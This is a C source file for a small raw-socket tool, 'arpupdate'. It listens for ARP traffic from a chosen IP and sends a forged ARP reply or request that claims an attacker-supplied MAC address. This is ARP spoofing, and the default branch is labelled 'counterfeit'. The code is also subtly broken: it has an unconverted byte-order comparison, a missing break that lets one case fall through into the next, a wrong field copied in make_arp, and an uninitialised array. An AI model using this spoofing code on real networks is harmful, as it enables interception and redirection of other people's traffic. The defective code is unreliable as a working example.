#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <unistd.h>
#include <stdbool.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>

#define CMAX 256
#define MAX_SIZE 8192

void die(char *msg);
void make_ethernet(
    struct ether_header *eth,
    uint8_t *ether_dhost,
    uint8_t *ether_shost,
    uint16_t ether_type
);
void make_arp(
    struct ether_arp *arp,
    unsigned short int op,
    uint8_t *arp_sha,
    uint8_t *arp_spa,
    uint8_t *arp_tha,
    uint8_t *arp_tpa
);

enum {
    CMD_NAME,
    IFNAME,
    DEST_IP,
    MAC_ADDRESS,
    OPTION 
};

enum { NORMAL, REPLY, REQUEST };

int main(int argc, char **argv) {
    puts("arpupdate");

    int flag = NORMAL;
    char ifname[CMAX];
    in_addr_t dest_ip;
    int tmp[6];
    unsigned char mac_address[6];
    int s;
    struct sockaddr sa;

    if (argc == 5) {
        if (strcmp(argv[OPTION], "reply") == 0) {
            flag = REPLY;
        } else if (strcmp(argv[OPTION], "request") == 0) {
            flag = REQUEST;
        } else {
            die("input error");
        }
    } else if (argc != 4) {
        die("input error");
    }

    snprintf(ifname, sizeof(ifname), "%s", argv[IFNAME]);
    dest_ip = inet_addr(argv[DEST_IP]);

    if (sscanf(argv[MAC_ADDRESS], "%x:%x:%x:%x:%x:%x", &tmp[0],
               &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]) != 6) {
        die("invalid mac address");
    }

    for (int i = 0;i < 6; i++) {
        mac_address[i] = (char)tmp[i];
    }

    if ((s = socket(AF_PACKET, SOCK_PACKET, htons(ETH_P_ARP))) < 0) {
        die("socket");
    }

    memset(&sa, 0, sizeof(sa));
    sa.sa_family = AF_PACKET;
    snprintf(sa.sa_data, sizeof(sa.sa_data), "%s", ifname);

    if (bind(s, &sa, sizeof(sa)) < 0) {
        die("bind");
    }

    while (true) {
        char recv_buf[MAX_SIZE];
        int nread;
        char *head;
        char *start_recv_buf;
        struct ether_header *eth;
        char send_buf[MAX_SIZE];
        char *sp;
        int nsend;

        if ((nread = read(s, recv_buf, MAX_SIZE)) < 0) {
            die("read");
        }

        head = start_recv_buf = recv_buf;
        eth = (struct ether_header *) head;
        head = head + sizeof(struct ether_header);

        if (eth->ether_type == ETHERTYPE_ARP) {
            struct ether_arp *arp;

            arp = (struct ether_arp *) head;
            if (*(int *)(arp->arp_spa) == dest_ip) {
                puts("Hits**********");

                unsigned char zero[6];
                unsigned char one[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

                sp = send_buf + sizeof(struct ether_header);

                switch (flag) {
                    case REPLY:
                        puts("reply");
                        make_ethernet((struct ether_header *) send_buf, arp->arp_sha, mac_address, ETHERTYPE_ARP);
                        make_arp((struct ether_arp *)sp, ARPOP_REPLY,
                                 mac_address, arp->arp_tpa, arp->arp_sha, arp->arp_spa);
                        break;
                    case REQUEST:
                        puts("request");
                        make_ethernet((struct ether_header *)send_buf, one,
                                      mac_address, ETHERTYPE_ARP);
                        make_arp((struct ether_arp *)sp, ARPOP_REQUEST,
                                 mac_address, arp->arp_spa, zero, arp->arp_tpa);
                    default:
                        puts("counterfeit");
                        make_ethernet((struct ether_header *)send_buf,
                                      arp->arp_sha, mac_address, ETHERTYPE_ARP);
                        make_arp((struct ether_arp *)sp, ARPOP_REQUEST,
                                 mac_address, arp->arp_tpa, zero, arp->arp_spa);
                        break;
                }

                // send_buf に書き込みが完了
                nsend = sizeof(struct ether_header) + sizeof(struct ether_arp);

                usleep(500 * 1000);

                if (sendto(s, send_buf, nsend, 0, &sa, sizeof(sa)) < 0) {
                    die("sendto");
                }

                puts("sent");
            }
        }

        break;
    }

    close(s);
}

void make_ethernet(
    struct ether_header *eth,
    uint8_t *ether_dhost,
    uint8_t *ether_shost,
    uint16_t ether_type
) {
    puts("make_ether");

    memcpy(eth->ether_dhost, ether_dhost, 6);
    memcpy(eth->ether_shost, ether_shost, 6);
    eth->ether_type = htons(ether_type);
}

void make_arp(
    struct ether_arp *arp,
    unsigned short int op,
    uint8_t *arp_sha,
    uint8_t *arp_spa,
    uint8_t *arp_tha,
    uint8_t *arp_tpa

) {
    puts("make_arp");

    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = 6;
    arp->arp_pln = 4;
    arp->arp_op = htons(op);
    memcpy(arp->arp_sha, arp_sha, 6);
    memcpy(arp->arp_spa, arp_spa, 4);
    memcpy(arp->arp_tha, arp_tha, 6);
    memcpy(arp->arp_tpa, arp_tha, 4);
}

void die(char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}
